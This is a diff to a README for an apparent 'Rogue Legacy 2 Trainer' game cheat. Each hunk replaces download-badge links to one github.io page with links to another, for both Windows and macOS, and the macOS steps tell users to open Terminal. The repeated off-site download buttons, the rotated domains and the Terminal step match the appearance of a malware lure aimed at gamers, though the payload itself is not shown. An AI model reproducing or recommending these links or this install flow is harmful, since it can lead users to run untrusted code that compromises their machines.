@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 </div>
 
@@ -78,9 +78,9 @@ Rogue Legacy 2 is the acclaimed sequel to the beloved roguelite where your desce
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
 
 </div>
 
@@ -101,7 +101,7 @@ Rogue Legacy 2 is the acclaimed sequel to the beloved roguelite where your desce
 
 <div align="center">
 
-[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 </div>
 
@@ -133,7 +133,7 @@ Rogue Legacy 2 is the acclaimed sequel to the beloved roguelite where your desce
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -158,7 +158,7 @@ Rogue Legacy 2 is the acclaimed sequel to the beloved roguelite where your desce
 
 <div align="center">
 
-[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Rogue Legacy 2 Trainer](https://img.shields.io/badge/⬇_Download_Rogue%20Legacy%202_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 </div>
 
